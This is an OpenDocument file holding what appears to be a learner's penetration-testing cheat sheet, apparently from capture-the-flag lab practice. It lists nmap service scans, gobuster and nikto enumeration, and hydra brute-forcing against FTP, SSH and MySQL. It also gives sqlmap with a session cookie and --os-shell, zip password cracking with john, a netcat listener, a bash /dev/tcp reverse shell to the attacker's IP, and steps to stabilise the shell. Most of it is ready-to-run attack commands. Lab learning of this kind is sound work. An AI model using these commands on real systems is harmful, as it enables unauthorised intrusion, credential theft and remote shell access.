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e4f" officeooo:paragraph-rsid="00076e4f"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" fo:font-weight="normal" officeooo:rsid="00076e4f" officeooo:paragraph-rsid="00076e4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76e4f" officeooo:paragraph-rsid="00076e4f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76e4f" officeooo:paragraph-rsid="0008d34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8d349" officeooo:paragraph-rsid="0008d349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officeooo:rsid="0008d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VIOLA</text:span> <text:s text:c="43"/><text:span text:style-name="T2">THE CHEAT SHEET</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">- <text:span text:style-name="T3">FTP:</text:span></text:p>
      <text:p text:style-name="P2">nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-libopie &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P5">ftp &lt;hostname&gt;</text:p>
      <text:p text:style-name="P2">- SSH:</text:p>
      <text:p text:style-name="P2">nmap -p 22 --script ssh-hostkey,ssh-auth-methods,ssh-run &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">ssh &lt;username&gt;@&lt;hostname&gt;</text:p>
      <text:p text:style-name="P2">- <text:span text:style-name="T3">Telnet:</text:span></text:p>
      <text:p text:style-name="P2">nmap -p 23 --script telnet-encryption &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">- <text:span text:style-name="T3">DNS:</text:span></text:p>
      <text:p text:style-name="P2">nmap -p 53 --script dns-recursion,dns-service-discovery,dns-zone-transfer &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">- <text:span text:style-name="T3">HTTP:</text:span></text:p>
      <text:p text:style-name="P2">nmap -p 80 --script http-enum,http-vuln-cve2017-5638,http-vuln-cve2017-9805 &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirb/common.txt</text:p>
      <text:p text:style-name="P2">-<text:span text:style-name="T3">HTTPS:</text:span></text:p>
      <text:p text:style-name="P2">nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-dh-params,ssl-heartbleed &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">nikto -h https://&lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">- <text:span text:style-name="T3">My</text:span>SQL:</text:p>
      <text:p text:style-name="P2">nmap -p 3306 --script mysql-empty-password,mysql-info,mysql-users,mysql-variables &lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">hydra -l &lt;username&gt; -P &lt;password_list&gt; mysql://&lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">mysql -h 10.129.178.251 -u root <text:s text:c="48"/></text:p>
      <text:p text:style-name="P5">show databases; use database_; show tables; select * …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----------------------------------- <text:s text:c="2"/><text:span text:style-name="T1">TOOLS <text:s/></text:span>-------------------------------------</text:p>
      <text:p text:style-name="P2">- whatweb</text:p>
      <text:p text:style-name="P2">- wafw00f</text:p>
      <text:p text:style-name="P2">- dirbuster<text:tab/></text:p>
      <text:p text:style-name="P2">- gobuster: <text:span text:style-name="T3">gobuster -dir -w word.txt -u taget_ip -x php,html,txt,</text:span></text:p>
      <text:p text:style-name="P2">- wpscan wpscan --url &lt;target_url&gt;</text:p>
      <text:p text:style-name="P2">- hydra</text:p>
      <text:p text:style-name="P2">hydra -l &lt;username&gt; -P &lt;password_list&gt; ftp://&lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">hydra -l &lt;username&gt; -P &lt;password_list&gt; ssh://&lt;target_ip&gt;</text:p>
      <text:p text:style-name="P2">- nikto:<text:span text:style-name="T3">nikto -h http://...</text:span></text:p>
      <text:p text:style-name="P2">-<text:span text:style-name="T3">sqlmap:</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --</text:p>
      <text:p text:style-name="P2">cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">--os-shell</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">sqlmap -u "http://example.com/product.php?id=1" –data="username=admin&amp;password=pass"</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">sqlmap -u "http://example.com/product.php?id=1" –dbs // <text:span text:style-name="T3">enumerate databse</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">-<text:span text:style-name="T3">burp suite</text:span></text:p>
      <text:p text:style-name="P2">-<text:span text:style-name="T3">john:</text:span></text:p>
      <text:p text:style-name="P2">zip2john /home/kali/Desktop/backup.zip &gt; zip_hash.txt</text:p>
      <text:p text:style-name="P2">john /home/kali/zip_hash.txt</text:p>
      <text:p text:style-name="P2">-<text:span text:style-name="T3">netcat: listener</text:span></text:p>
      <text:p text:style-name="P2">nc -lvnp 443</text:p>
      <text:p text:style-name="P2">- <text:span text:style-name="T3">bash: reverse shell</text:span></text:p>
      <text:p text:style-name="P2">bash -c "bash -i &gt;&amp; /dev/tcp/<text:span text:style-name="T3">{my ip}</text:span>/443 0&gt;&amp;1"</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4"><text:soft-page-break/>“</text:p>
      <text:p text:style-name="P5">make shell fully interactive </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4">python3 -c 'import pty;pty.spawn("/bin/bash")'</text:p>
      <text:p text:style-name="P4">CTRL+Z</text:p>
      <text:p text:style-name="P4">stty raw -echo</text:p>
      <text:p text:style-name="P4">fg</text:p>
      <text:p text:style-name="P4">export TERM=xterm</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">”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9:05:57.342865828</meta:creation-date>
    <dc:date>2024-08-04T23:42:31.754170274</dc:date>
    <meta:editing-duration>PT13H31M33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3" meta:paragraph-count="55" meta:word-count="211" meta:character-count="2017" meta:non-whitespace-character-count="1774"/>
  </office:meta>
</office:document-meta>
</file>